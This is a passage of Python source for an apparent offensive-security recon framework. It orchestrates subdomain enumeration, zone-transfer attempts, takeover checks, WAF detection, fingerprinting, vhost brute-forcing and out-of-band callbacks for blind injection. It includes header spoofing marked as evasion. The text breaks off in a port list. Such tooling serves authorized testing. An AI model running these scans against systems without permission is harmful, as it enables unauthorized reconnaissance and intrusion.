#!/usr/bin/env python3
"""
Apex v4.0 — PART 1: Core + Recon + Discovery
===============================================================
Combine with attack.py to produce the full apex:
    cat core.py attack.py > apex.py

Standalone imports are safe — no circular dependencies.
"""

import base64
import concurrent.futures
import fnmatch
import hashlib
import json
import os
import random
import re
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Iterator, Optional, Union

# ══════════════════════════════════════════════════════════════
# 1. CONSTANTS & TOOL PATHS
# ══════════════════════════════════════════════════════════════

VERSION  = "4.1.0"
SECLISTS = Path("/usr/share/seclists")

WORDLISTS = {
    "dirs_small":   SECLISTS / "Discovery/Web-Content/common.txt",
    "dirs_medium":  SECLISTS / "Discovery/Web-Content/raft-medium-directories.txt",
    "dirs_large":   SECLISTS / "Discovery/Web-Content/raft-large-directories.txt",
    "files_medium": SECLISTS / "Discovery/Web-Content/raft-medium-files.txt",
    "subdomains":   SECLISTS / "Discovery/DNS/subdomains-top1million-110000.txt",
    "vhosts":       SECLISTS / "Discovery/DNS/subdomains-top1million-5000.txt",
    "sqli":         SECLISTS / "Fuzzing/SQLi/Generic-SQLi.txt",
    "xss":          SECLISTS / "Fuzzing/XSS/XSS-Jhaddix.txt",
    "lfi":          SECLISTS / "Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
    "passwords":    Path("/usr/share/wordlists/rockyou.txt"),
}

# Load tool paths written by install.sh
_CFG: dict = {}
_CFG_PATH = Path.home() / ".apex_tools.json"
if _CFG_PATH.exists():
    try:
        _CFG = json.loads(_CFG_PATH.read_text())
    except Exception:
        pass

# Global config from ~/.apex_config.yaml (Fix 6)
CONFIG: dict = {}
_USER_CONFIG = Path.home() / ".apex_config.yaml"
if _USER_CONFIG.exists():
    try:
        import yaml
        CONFIG = yaml.safe_load(_USER_CONFIG.read_text()) or {}
    except Exception:
        # log is not yet defined, so we'll skip logging here
        pass

TOOLS_DIR    = Path(_CFG.get("tools_dir",    Path.home() / "tools"))
GO_BIN       = Path(_CFG.get("go_bin",       Path.home() / "go/bin"))
JWT_TOOL     = Path(_CFG.get("jwt_tool",     TOOLS_DIR / "jwt_tool/jwt_tool.py"))
SMUGGLER     = Path(_CFG.get("smuggler",     TOOLS_DIR / "smuggler/smuggler.py"))
SSRFMAP      = Path(_CFG.get("ssrfmap",      TOOLS_DIR / "SSRFmap/ssrfmap.py"))
CORSY        = Path(_CFG.get("corsy",        TOOLS_DIR / "Corsy/corsy.py"))
LINKFINDER   = Path(_CFG.get("linkfinder",   TOOLS_DIR / "LinkFinder/linkfinder.py"))
SECRETFINDER = Path(_CFG.get("secretfinder", TOOLS_DIR / "SecretFinder/SecretFinder.py"))

SEV_ORDER  = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
CONF_ORDER = {"certain": 0, "firm": 1, "tentative": 2}

# ══════════════════════════════════════════════════════════════
# 2. COLOURS & LOGGING
# ══════════════════════════════════════════════════════════════

class C:
    RED    = "\033[91m"; ORANGE = "\033[93m"; YELLOW = "\033[33m"
    GREEN  = "\033[92m"; CYAN   = "\033[96m"; BLUE   = "\033[94m"
    PURPLE = "\033[95m"; BOLD   = "\033[1m";  DIM    = "\033[2m"
    RESET  = "\033[0m"
    SEV  = {"critical": RED,   "high": ORANGE, "medium": YELLOW,
            "low": BLUE,       "info": DIM}
    ICON = {"critical": "🔴", "high": "🟠",   "medium": "🟡",
            "low": "🔵",       "info": "⚪"}

_log_lock = threading.Lock()

def log(msg: str, level: str = "info", tool: str = "", host: str = ""):
    ts  = datetime.now().strftime("%H:%M:%S")
    col = {"info": C.CYAN, "warn": C.YELLOW, "error": C.RED,
           "ok":   C.GREEN, "phase": C.PURPLE, "skip": C.DIM
           }.get(level, C.CYAN)
    parts = [f"{C.DIM}[{ts}]{C.RESET}", f"{col}[{level.upper():5}]{C.RESET}"]
    if tool: parts.append(f"{C.BOLD}[{tool}]{C.RESET}")
    if host: parts.append(f"{C.DIM}({host}){C.RESET}")
    with _log_lock:
        print(" ".join(parts) + " " + msg, flush=True)

def notify(finding: dict, webhook: Optional[str] = None):
    """Send real-time notification for critical findings (Fix 7)."""
    if not webhook or finding.get("severity") not in ("critical", "high"):
        return
    sev_label = finding.get("severity", "high").upper()
    msg = {
        "content": f"🚨 **{sev_label} FINDING** on `{finding.get('target')}`",
        "embeds": [{
            "title": finding.get("title"),
            "color": 15158332, # Red
            "fields": [
                {"name": "Tool",   "value": finding.get("tool", "unknown"), "inline": True},
                {"name": "ID",     "value": finding.get("checklist_id", "?"), "inline": True},
                {"name": "Detail", "value": (finding.get("detail") or "No details")[:1024]}
            ]
        }]
    }
    try:
        req = urllib.request.Request(
            webhook, data=json.dumps(msg).encode(),
            headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(req, timeout=10):
            pass
    except Exception as e:
        log(f"Notification failed: {e}", "error", "notify")

def finding_log(f: dict):
    sev    = f.get("severity", "info")
    col    = C.SEV.get(sev, C.RESET)
    icon   = C.ICON.get(sev, "⚪")
    cid    = f.get("checklist_id", "?")
    title  = f.get("title", "")
    detail = (f.get("detail") or "")[:90]
    host   = f.get("target", "")
    conf   = f.get("confidence", "firm")
    with _log_lock:
        print(f"  {icon} {col}[{sev.upper():8}]{C.RESET} "
              f"[{cid}] {C.DIM}({host}){C.RESET} {title} {C.DIM}[{conf}]{C.RESET}", flush=True)
        if detail:
            print(f"     {C.DIM}↳ {detail}{C.RESET}", flush=True)

# ══════════════════════════════════════════════════════════════
# 3. TOOL REGISTRY
# ══════════════════════════════════════════════════════════════

class ToolRegistry:
    """Single source of truth for tool availability and paths."""

    TOOL_DEFS = [
        ("subfinder",         "which"), ("httpx",             "which"),
        ("naabu",             "which"), ("nuclei",            "which"),
        ("katana",            "which"), ("dnsx",              "which"),
        ("interactsh-client", "which"), ("ffuf",              "which"),
        ("feroxbuster",       "which"), ("amass",             "which"),
        ("gau",               "which"), ("waybackurls",       "which"),
        ("gf",                "which"), ("anew",              "which"),
        ("qsreplace",         "which"), ("crlfuzz",           "which"),
        ("sqlmap",            "which"), ("dalfox",            "which"),
        ("nikto",             "which"), ("wpscan",            "which"),
        ("nmap",              "which"), ("gobuster",          "which"),
        ("arjun",             "which"), ("git-dumper",        "which"),
        ("trufflehog",        "which"), ("byp4xx",            "which"),
        ("paramspider",       "which"), ("wafw00f",           "which"),
        ("jwt_tool",          "path"),  ("smuggler",          "path"),
        ("ssrfmap",           "path"),  ("corsy",             "path"),
        ("linkfinder",        "path"),  ("secretfinder",      "which"),
    ]
    _PATH_TOOLS = {
        "jwt_tool": JWT_TOOL,   "smuggler":    SMUGGLER,
        "ssrfmap":  SSRFMAP,    "corsy":       CORSY,
        "linkfinder": LINKFINDER,
    }

    def __init__(self):
        self._avail: dict = {}
        self._paths: dict = {}
        for name, kind in self.TOOL_DEFS:
            if kind == "which":
                found = shutil.which(name)
                if not found:
                    gp = GO_BIN / name
                    if gp.exists():
                        found = str(gp)
                self._avail[name] = bool(found)
                if found:
                    self._paths[name] = found
            else:
                p  = self._PATH_TOOLS.get(name)
                ex = p.exists() if p else False
                self._avail[name] = ex
                if ex:
                    self._paths[name] = str(p)

    def has(self, *names: str) -> bool:
        return all(self._avail.get(n, False) for n in names)

    def path(self, name: str) -> str:
        return self._paths.get(name, name)

    def wordlist(self, key: str) -> Optional[str]:
        p = WORDLISTS.get(key)
        return str(p) if p and p.exists() else None

    def print_status(self):
        avail   = [n for n, _ in self.TOOL_DEFS if self._avail.get(n)]
        missing = [n for n, _ in self.TOOL_DEFS if not self._avail.get(n)]
        log(f"{len(avail)}/{len(self.TOOL_DEFS)} tools available", "info")
        for n in avail:
            print(f"    {C.GREEN}✓{C.RESET} {n:<26} {C.DIM}{self._paths[n]}{C.RESET}")
        for n in missing:
            print(f"    {C.RED}✗{C.RESET} {n:<26} {C.DIM}not found — run install.sh{C.RESET}")

# ══════════════════════════════════════════════════════════════
# 4. OOB / INTERACTSH MANAGER
# ══════════════════════════════════════════════════════════════

class OOBManager:
    """
    Manages interactsh-client lifecycle.
    Every probe gets a unique subdomain so callbacks can be correlated
    back to the specific test that triggered them.
    """

    def __init__(self, registry: ToolRegistry):
        self.reg        = registry
        self.domain:    Optional[str]              = None
        self.callbacks: list[dict]                 = []
        self._proc:     Optional[subprocess.Popen] = None
        self._out_file: Optional[Path]             = None
        self._active    = False
        self._stop      = threading.Event()
        self._probes:   dict[str, str]             = {}

    def start(self, out_dir: Path) -> Optional[str]:
        if not self.reg.has("interactsh-client"):
            log("interactsh-client not found — OOB disabled", "warn", "oob")
            return None
        self._out_file = out_dir / "oob_callbacks.json"
        cmd = [
            self.reg.path("interactsh-client"),
            "-server", "oast.fun", "-json",
            "-o", str(self._out_file), "-v",
        ]
        try:
            self._proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            deadline = time.time() + 20
            while time.time() < deadline:
                line = self._proc.stdout.readline()
                m = re.search(
                    r'([a-z0-9]{8,}\.oast\.(?:fun|me|live|pro|online|site))', line)
                if m:
                    self.domain  = m.group(1)
                    self._active = True
                    log(f"OOB domain: {self.domain}", "ok", "oob")
                    threading.Thread(
                        target=self._poll_loop, daemon=True).start()
                    return self.domain
                time.sleep(0.25)
        except Exception as e:
            log(f"interactsh start failed: {e}", "warn", "oob")
        return None

    def probe_url(self, label: str, context: str = "") -> Optional[str]:
        """
        Return a unique HTTP callback URL for injection testing.
        Returns None when OOB is not active — callers must handle None
        and fall back to direct-response SSRF detection only.
        """
        if not self.domain:
            return None
        safe = re.sub(r"[^a-z0-9]", "", label.lower())[:20]
        self._probes[safe] = context
        return f"http://{safe}.{self.domain}"

    def dns_host(self, label: str) -> Optional[str]:
        """
        Return a unique DNS callback hostname for blind injection testing.
        Returns None when OOB is not active.
        """
        if not self.domain:
            return None
        safe = re.sub(r"[^a-z0-9]", "", label.lower())[:20]
        self._probes[safe] = label
        return f"{safe}.{self.domain}"

    def _poll_loop(self):
        while not self._stop.is_set():
            self._read_new()
            time.sleep(5)

    def _read_new(self):
        if not self._out_file or not self._out_file.exists():
            return
        seen = {json.dumps(c, sort_keys=True) for c in self.callbacks}
        try:
            for line in self._out_file.read_text().splitlines():
                line = line.strip()
                if line and line not in seen:
                    try:
                        cb = json.loads(line)
                        self.callbacks.append(cb)
                        seen.add(line)
                        uid  = cb.get("unique-id", "")
                        prot = cb.get("protocol", "?").upper()
                        src  = cb.get("remote-address", "?")
                        ctx  = self._probes.get(uid.split(".")[0], "")
                        log(f"OOB! {prot} from {src} uid={uid} ctx={ctx}",
                            "ok", "oob")
                    except Exception:
                        pass
        except Exception:
            pass

    def stop(self):
        self._stop.set()
        time.sleep(2)
        self._read_new()
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=5)
            except Exception:
                pass

# ══════════════════════════════════════════════════════════════
# 5. FINDING MODEL & DEDUPLICATED STORE
# ══════════════════════════════════════════════════════════════

class Finding:
    __slots__ = ("checklist_id", "title", "severity", "confidence", "detail",
                 "evidence", "tool", "target", "remediation",
                 "timestamp", "_dedup_key")

    def __init__(self, checklist_id: str, title: str, severity: str,
                 confidence: str = "firm", detail: str = "", evidence: str = "",
                 tool: str = "", target: str = "", remediation: str = ""):
        self.checklist_id = checklist_id
        self.title        = title
        self.severity     = severity
        self.confidence   = confidence # Fix 8
        self.detail       = detail
        self.evidence     = (evidence or "")[:1500]
        self.tool         = tool
        self.target       = target
        self.remediation  = remediation
        self.timestamp    = datetime.utcnow().isoformat()
        key = f"{checklist_id}|{target}|{detail[:80]}"
        self._dedup_key = hashlib.sha256(key.encode()).hexdigest()[:16]

    def to_dict(self) -> dict:
        return {s: getattr(self, s)
                for s in self.__slots__ if not s.startswith("_")}


class FindingStore:
    """Thread-safe, auto-deduplicating finding collection."""

    def __init__(self, webhook: Optional[str] = None, min_conf: str = "tentative"):
        self._findings: list[Finding] = []
        self._seen:     set[str]      = set()
        self._lock      = threading.Lock()
        self.webhook    = webhook
        self.min_conf   = min_conf

    def add(self, f: Finding) -> bool:
        if CONF_ORDER.get(f.confidence, 99) > CONF_ORDER.get(self.min_conf, 99):
            return False # Filtered by confidence (Fix 8)
        
        with self._lock:
            if f._dedup_key in self._seen:
                return False
            self._seen.add(f._dedup_key)
            self._findings.append(f)
        
        finding_log(f.to_dict())
        notify(f.to_dict(), self.webhook) # Fix 7
        return True

    def extend(self, findings: list):
        for f in findings:
            self.add(f)

    def all(self) -> list:
        with self._lock:
            return sorted(self._findings,
                          key=lambda x: SEV_ORDER.get(x.severity, 99))

    def count(self) -> dict:
        c: dict = defaultdict(int)
        for f in self.all():
            c[f.severity] += 1
        return dict(c)

    def save(self, path: Path):
        path.write_text(
            json.dumps([f.to_dict() for f in self.all()], indent=2))

# ══════════════════════════════════════════════════════════════
# 6. CHECKPOINT / RESUME
# ══════════════════════════════════════════════════════════════

class Checkpoint:
    """
    Persists scan state so interrupted scans can be resumed.
    Tracks completed (runner, host) pairs and cross-phase data
    (param_urls, 403 hits, JS URLs) shared between runners.
    Optimized with set-based lookups (Fix 2).
    """

    def __init__(self, path: Path):
        self.path  = path
        self._lock = threading.Lock()
        self._data = self._load()
        # shadow sets for O(1) membership checks (Fix 2)
        self._sets = {}
        for k in ("completed", "live_hosts", "param_urls", "urls_403", "js_urls"):
            v = self._data.get(k, [])
            self._sets[k] = set(v) if isinstance(v, list) else set()

    def _load(self) -> dict:
        if self.path.exists():
            try:
                return json.loads(self.path.read_text())
            except Exception:
                pass
        return {
            "completed":    [],
            "live_hosts":   [],
            "param_urls":   [],
            "urls_403":     [],
            "js_urls":      [],
        }

    def save(self):
        with self._lock:
            self.path.write_text(json.dumps(self._data, indent=2))

    def is_done(self, runner: str, host: str) -> bool:
        key = f"{runner}:{host}"
        return key in self._sets.get("completed", set())

    def mark_done(self, runner: str, host: str):
        key = f"{runner}:{host}"
        with self._lock:
            if key not in self._sets["completed"]:
                self._sets["completed"].add(key)
                self._data["completed"].append(key)
        self.save()

    def get(self, key: str, default=None):
        return self._data.get(key, default)

    def set(self, key: str, value):
        with self._lock:
            self._data[key] = value
            if key in self._sets:
                self._sets[key] = set(value) if isinstance(value, list) else set()
        self.save()

    def append(self, key: str, value):
        with self._lock:
            if key not in self._sets:
                self._sets[key] = set(self._data.get(key, []))
            
            if value not in self._sets[key]:
                self._sets[key].add(value)
                self._data.setdefault(key, []).append(value)
        self.save()

# ══════════════════════════════════════════════════════════════
# 7. BASE RUNNER
# ══════════════════════════════════════════════════════════════

class BaseRunner:
    NAME     = "base"
    CATEGORY = "base"

    def __init__(self, host: str, out_root: Path,
                 registry: ToolRegistry, oob: OOBManager,
                 store: FindingStore, ckpt: Checkpoint,
                 opts: dict):
        if host.startswith("http"):
            parsed        = urllib.parse.urlparse(host)
            self.host     = parsed.netloc
            self.base_url = host.rstrip("/")
        else:
            self.host     = host
            self.base_url = f"https://{host}"

        safe       = self.host.replace(":", "_").replace("/", "_")
        self.out   = out_root / self.NAME / safe
        self.out.mkdir(parents=True, exist_ok=True)

        self.registry = registry
        self.oob      = oob
        self.store    = store
        self.ckpt     = ckpt
        self.opts     = opts
        self._local:  list[Finding] = []

    @staticmethod
    def _random_ip() -> str:
        import random
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    # ── subprocess: streaming line-by-line (never buffers full output) ──

    def stream_cmd(self, cmd: list, timeout: int = 600,
                   env: dict = None) -> Iterator[str]:
        full_env = {**os.environ, **(env or {})}
        str_cmd  = [str(c) for c in cmd]
        log(f"$ {' '.join(str_cmd[:8])}{'...' if len(str_cmd)>8 else ''}",
            "info", self.NAME, self.host)
        
        # Log stderr to file (Fix 4)
        stderr_log = self.out / "stderr.log"
        
        try:
            with open(stderr_log, "a") as err_f:
                proc = subprocess.Popen(
                    str_cmd, stdout=subprocess.PIPE, stderr=err_f,
                    text=True, env=full_env, bufsize=1)
                deadline = time.time() + timeout
                while True:
                    if time.time() > deadline:
                        proc.terminate()
                        log(f"Timeout ({timeout}s)", "warn", self.NAME, self.host)
                        break
                    line = proc.stdout.readline()
                    if line:
                        yield line.rstrip("\n")
                    elif proc.poll() is not None:
                        for line in proc.stdout:
                            yield line.rstrip("\n")
                        break
                    else:
                        time.sleep(0.05)
        except FileNotFoundError:
            log(f"Not found: {str_cmd[0]}", "warn", self.NAME, self.host)
        except Exception as e:
            log(f"stream_cmd error: {e}", "error", self.NAME, self.host)

    def run_cmd(self, cmd: list, timeout: int = 300,
                env: dict = None, stdin: str = None) -> tuple:
        """
        Use stream_cmd for long-running tools.
        Use this only when stdin is needed or output is guaranteed short.
        """
        if stdin is not None:
            try:
                r = subprocess.run(
                    [str(c) for c in cmd],
                    input=stdin, capture_output=True, text=True,
                    timeout=timeout, env={**os.environ, **(env or {})})
                return r.returncode, r.stdout, r.stderr
            except Exception as e:
                return -1, "", str(e)
        lines = list(self.stream_cmd(cmd, timeout=timeout, env=env))
        return 0, "\n".join(lines), ""

    # ── HTTP helper ──────────────────────────────────────────────────────

    def http(self, path_or_url: str, headers: dict = None,
             method: str = "GET", data: bytes = None,
             timeout: int = 10) -> Optional[dict]:
        url = (path_or_url if path_or_url.startswith("http")
               else self.base_url + path_or_url)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        
        # Basic Evasion (Fix 5)
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        h = {"User-Agent": "Mozilla/5.0 Apex/4.1",
             "Accept":     "text/html,application/json,*/*",
             "X-Forwarded-For": ip, "X-Real-IP": ip, "X-Originating-IP": ip}
        
        if self.opts.get("cookie"):
            h["Cookie"] = self.opts["cookie"]
        if self.opts.get("bearer"):
            h["Authorization"] = f"Bearer {self.opts['bearer']}"
        h.update(headers or {})
        try:
            req = urllib.request.Request(
                url, data=data, headers=h, method=method)
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return {"status": r.status,
                        "body": r.read(500_000).decode("utf-8", errors="ignore"),
                        "headers": dict(r.headers), "url": r.url}
        except urllib.error.HTTPError as e:
            body = ""
            try:
                body = e.read(10_000).decode("utf-8", errors="ignore")
            except Exception:
                pass
            return {"status": e.code, "body": body,
                    "headers": dict(e.headers), "url": url}
        except Exception:
            return None

    # ── finding helpers ──────────────────────────────────────────────────

    def add(self, cid: str, title: str, severity: str,
            confidence: str = "firm", detail: str = "", evidence: str = "",
            remediation: str = "") -> Finding:
        f = Finding(cid, title, severity, confidence, detail, evidence,
                    self.NAME, self.host, remediation)
        if self.store.add(f):
            self._local.append(f)
        return f

    def save_local(self):
        p = self.out / f"{self.NAME}_findings.json"
        p.write_text(json.dumps(
            [f.to_dict() for f in self._local], indent=2))

    # ── auth args for CLI tools ──────────────────────────────────────────

    @property
    def auth_args(self) -> list:
        """httpx / feroxbuster / dalfox compatible -H args."""
        args = []
        if self.opts.get("cookie"):
            args += ["-H", f"Cookie: {self.opts['cookie']}"]
        if self.opts.get("bearer"):
            args += ["-H", f"Authorization: Bearer {self.opts['bearer']}"]
        for h in self.opts.get("extra_headers", []):
            args += ["-H", h]
        
        # Evasion (Fix 5)
        args += [
            "-H", f"X-Forwarded-For: {self._random_ip()}",
            "-H", f"X-Real-IP: {self._random_ip()}",
        ]
        
        return args

    @property
    def rate_limit(self) -> int:
        base = int(self.opts.get("rate_limit", 100))
        if self.opts.get("waf_detected"):
            return max(10, base // 5)   # 20% of normal rate when WAF present
        return base

    def run(self) -> list:
        raise NotImplementedError

# ══════════════════════════════════════════════════════════════
# 8. RECON RUNNERS  (run once on the root domain)
# ══════════════════════════════════════════════════════════════

class SubfinderRunner(BaseRunner):
    """r1, r12 — Subdomain enumeration: subfinder + amass + crt.sh."""
    NAME = "subfinder"
    CATEGORY = "recon"

    def run(self) -> list:
        subs: set = set()

        # subfinder
        if self.registry.has("subfinder"):
            out = self.out / "subfinder.txt"
            cmd = [
                self.registry.path("subfinder"),
                "-d", self.host, "-o", str(out),
                "-all", "-silent", "-timeout", "30",
            ]
            # Fix 6: API keys
            if (Path.home() / ".config/subfinder/provider-config.yaml").exists():
                 pass # subfinder uses it automatically
            
            for line in self.stream_cmd(cmd, timeout=300):
                s = line.strip()
                if s and "." in s:
                    subs.add(s)
        else:
            log("subfinder not found", "warn", self.NAME)

        # amass passive
        if self.registry.has("amass"):
            out = self.out / "amass.txt"
            for line in self.stream_cmd([
                self.registry.path("amass"), "enum",
                "-passive", "-d", self.host,
                "-o", str(out), "-timeout", "5",
            ], timeout=360):
                s = line.strip()
                if s and "." in s:
                    subs.add(s)

        # crt.sh passive
        subs.update(self._crtsh())

        # Scope enforcement (Fix 3) handled by Apex calling this,
        # but let's filter here too for safety.
        scope = self.opts.get("scope_patterns", [])
        if scope:
            filtered = {s for s in subs if any(fnmatch.fnmatch(s, p) for p in scope)}
            log(f"Scope filtered {len(subs)} → {len(filtered)} subdomains", "info", self.NAME)
            subs = filtered

        # Write merged list
        all_file = self.out / "all_subdomains.txt"
        all_file.write_text("\n".join(sorted(subs)))
        log(f"Found {len(subs)} subdomains", "ok", self.NAME, self.host)

        for s in sorted(subs)[:500]:
            self.add("r1/r12", f"Subdomain: {s}", "info", "certain", s)
        return self._local

    def _crtsh(self) -> set:
        subs: set = set()
        try:
            r = self.http(
                f"https://crt.sh/?q=%.{self.host}&output=json", timeout=15)
            if r and r["status"] == 200:
                for entry in json.loads(r["body"]):
                    for name in entry.get("name_value", "").splitlines():
                        name = name.strip().lstrip("*.")
                        if name.endswith(self.host):
                            subs.add(name)
        except Exception:
            pass
        return subs

    def subdomain_file(self) -> Optional[Path]:
        p = self.out / "all_subdomains.txt"
        return p if p.exists() else None


class DNSXRunner(BaseRunner):
    """r2, d7 — DNS zone transfer + CNAME-based takeover detection."""
    NAME = "dnsx"
    CATEGORY = "recon"

    TAKEOVER = {
        "github.io":         "There isn't a GitHub Pages site here",
        "herokuapp.com":     "No such app",
        "amazonaws.com":     "NoSuchBucket",
        "azurewebsites.net": "404 Web Site not found",
        "ghost.io":          "The thing you were looking for is no longer here",
        "surge.sh":          "project not found",
        "fastly.net":        "Fastly error: unknown domain",
        "zendesk.com":       "Help Center Closed",
        "bitbucket.io":      "Repository not found",
        "shopify.com":       "currently unavailable",
        "readme.io":         "Project doesnt exist",
    }

    def run(self) -> list:
        self._zone_transfer()

        # Resolve subdomains and check CNAMEs
        subs_file = (self.out.parent.parent /
                     "subfinder" / self.host.replace(":", "_") /
                     "all_subdomains.txt")
        if not subs_file.exists():
            return self._local
        if not self.registry.has("dnsx"):
            log("dnsx not found — takeover check skipped", "skip", self.NAME)
            return self._local

        out_json = self.out / "dnsx_cnames.json"
        for _ in self.stream_cmd([
            self.registry.path("dnsx"),
            "-l", str(subs_file),
            "-cname", "-resp", "-json",
            "-o", str(out_json),
            "-silent", "-rl", "100",
        ], timeout=300):
            pass  # output piped to file

        if out_json.exists():
            for line in out_json.read_text().splitlines():
                try:
                    d = json.loads(line)
                    host_val = d.get("host", "")
                    for cname in d.get("cname", []):
                        for svc, fingerprint in self.TAKEOVER.items():
                            if svc in cname:
                                confirmed = self._http_verify(
                                    host_val, fingerprint)
                                if confirmed:
                                    self.add("d7", f"Subdomain takeover CONFIRMED: {host_val}", "high", "certain",
                                        f"CNAME → {cname} | fingerprint "
                                        f"'{fingerprint[:40]}' found in response",
                                        f"CNAME: {cname}")
                                else:
                                    self.add("d7", f"Takeover candidate (unverified): {host_val}", "low", "tentative",
                                        f"CNAME → {cname} ({svc}) but "
                                        f"fingerprint not found — may be claimed",
                                        f"CNAME: {cname}")
                except Exception:
                    pass
        return self._local

    def _http_verify(self, host: str, fingerprint: str) -> bool:
        for scheme in ("https", "http"):
            url = f"{scheme}://{host}"
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                req = urllib.request.Request(
                    url, headers={"User-Agent": "Mozilla/5.0 Apex/4.1"})
                with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                    body = r.read(50_000).decode("utf-8", errors="ignore")
                    if fingerprint.lower() in body.lower():
                        return True
            except urllib.error.HTTPError as e:
                try:
                    body = e.read(10_000).decode("utf-8", errors="ignore")
                    if fingerprint.lower() in body.lower():
                        return True
                except Exception:
                    pass
            except Exception:
                pass
        return False

    def _zone_transfer(self):
        rc, out, _ = self.run_cmd(
            ["dig", "+short", "NS", self.host], timeout=15)
        for ns in out.splitlines():
            ns = ns.strip().rstrip(".")
            if not ns:
                continue
            rc2, axfr, _ = self.run_cmd(
                ["dig", "AXFR", f"@{ns}", self.host], timeout=15)
            if (axfr and len(axfr) > 300
                    and "Transfer failed" not in axfr
                    and "connection refused" not in axfr.lower()):
                self.add("r2", f"Zone transfer (AXFR) on {ns}", "high", "certain",
                         f"NS {ns} returned full zone data", axfr[:600])


class WafRunner(BaseRunner):
    """WAF detection using wafw00f (Fix 5)."""
    NAME = "wafw00f"
    CATEGORY = "fingerprint"

    def run(self) -> list:
        if not self.registry.has("wafw00f"):
            log("wafw00f not found", "skip", self.NAME)
            return self._local
        
        found = "None"
        for line in self.stream_cmd([
            self.registry.path("wafw00f"), self.base_url
        ], timeout=60):
            if "is behind" in line:
                found = line.split("is behind")[-1].strip()
                self.add("waf", f"WAF detected: {found}", "info", "certain",
                         f"WAF: {found}", found)
        
        log(f"WAF: {found}", "ok", self.NAME, self.host)
        if found != "None":
            self.opts["waf_detected"] = found
        return self._local

class HttpxFingerprintRunner(BaseRunner):
    """Tech fingerprinting of all live hosts (root + subdomains)."""
    NAME = "httpx_fp"
    CATEGORY = "fingerprint"

    def run(self) -> list:
        if not self.registry.has("httpx"):
            log("httpx not found", "skip", self.NAME)
            return self._local

        # Build target list
        targets: set = {self.host}
        subs_file = (self.out.parent.parent /
                     "subfinder" / self.host.replace(":", "_") /
                     "all_subdomains.txt")
        if subs_file.exists():
            for s in subs_file.read_text().splitlines():
                if s.strip():
                    targets.add(s.strip())

        # Scope enforcement (Fix 3)
        scope = self.opts.get("scope_patterns", [])
        if scope:
            filtered = {s for s in targets if any(fnmatch.fnmatch(s, p) for p in scope)}
            log(f"Scope filtered {len(targets)} → {len(filtered)} targets", "info", self.NAME)
            targets = filtered

        targets_file = self.out / "targets.txt"
        targets_file.write_text("\n".join(sorted(targets)))
        out_json = self.out / "httpx_results.json"

        for _ in self.stream_cmd([
            self.registry.path("httpx"),
            "-l",           str(targets_file),
            "-o",           str(out_json),
            "-json",
            "-status-code", "-title", "-tech-detect",
            "-follow-redirects",
            "-threads",     "50",
            "-rate-limit",  str(min(self.rate_limit, 200)),
            "-timeout",     "10",
            "-retries",     "1",
            "-no-color",    "-silent",
        ] + self.auth_args, timeout=600):
            pass

        profiles = self._parse(out_json)
        log(f"Fingerprinted {len(profiles)} live hosts",
            "ok", self.NAME, self.host)
        return self._local

    def _parse(self, json_file: Path) -> dict:
        profiles = {}
        if not json_file.exists():
            return profiles
        for line in json_file.read_text().splitlines():
            try:
                d = json.loads(line)
                host   = d.get("input", d.get("host", ""))
                url    = d.get("url", f"https://{host}")
                status = d.get("status-code", 0)
                techs  = [
                    (t.get("name") if isinstance(t, dict) else str(t)).lower()
                    for t in d.get("tech", [])
                ]
                if host and 100 <= status < 600:
                    profiles[host] = {
                        "url":       url,
                        "status":    status,
                        "title":     d.get("title", ""),
                        "tech":      techs,
                        "webserver": d.get("webserver", "").lower(),
                        "cdn":       bool(d.get("cdn")),
                    }
            except Exception:
                pass
        return profiles

    def profiles(self) -> dict:
        return self._parse(self.out / "httpx_results.json")

    def live_urls(self) -> list:
        return [p["url"] for p in self.profiles().values()
                if 100 <= p.get("status", 0) < 500]

# ══════════════════════════════════════════════════════════════
# 9. DISCOVERY RUNNERS  (run per live host)
# ══════════════════════════════════════════════════════════════

class VHostRunner(BaseRunner):
    """
    r3 — Virtual host discovery via gobuster vhost.
    Only runs once per unique resolved IP — running it on every subdomain
    that shares the same server is redundant and wastes hours.
    """
    NAME = "vhost"
    CATEGORY = "discover"

    def run(self) -> list:
        if not self.registry.has("gobuster"):
            log("gobuster not found", "skip", self.NAME)
            return self._local
        wl = (self.registry.wordlist("vhosts") or
              self.registry.wordlist("subdomains"))
        if not wl:
            log("No vhost wordlist available", "skip", self.NAME)
            return self._local

        # Resolve IP and skip if we've already vhost-scanned this server
        resolved_ip = self._resolve_ip()
        if resolved_ip:
            ckpt_key = f"vhost_scanned_ip:{resolved_ip}"
            if self.ckpt.get(ckpt_key):
                log(f"IP {resolved_ip} already vhost-scanned — skipping",
                    "skip", self.NAME, self.host)
                return self._local
            self.ckpt.set(ckpt_key, True)

        found: list = []
        for line in self.stream_cmd([
            self.registry.path("gobuster"), "vhost",
            "-u",           self.base_url,
            "-w",           wl,
            "--no-error",
            "-t",           "50",
            "--rate-limit", str(self.rate_limit),
            "--timeout",    "10s",
            "--append-domain",
        ] + self.auth_args, timeout=600):
            m = re.search(r'Found:\s+(\S+)', line)
            if m:
                vh = m.group(1).strip()
                found.append(vh)
                self.add("r3", f"Virtual host: {vh}", "medium", "firm",
                         f"Host header '{vh}' returns different response "
                         f"on {resolved_ip or self.host}",
                         vh)

        if found:
            (self.out / "vhosts_found.txt").write_text("\n".join(found))
        log(f"{len(found)} virtual hosts on {resolved_ip or self.host}",
            "ok", self.NAME, self.host)
        return self._local

    def _resolve_ip(self) -> Optional[str]:
        try:
            return socket.gethostbyname(self.host)
        except Exception:
            return None


class NaabuRunner(BaseRunner):
    """r6, in8 — Port scan for dangerous open services."""
    NAME = "naabu"
    CATEGORY = "discover"

    PORTS = {
        21:    "FTP",        22:    "SSH",         23:    "Telnet",
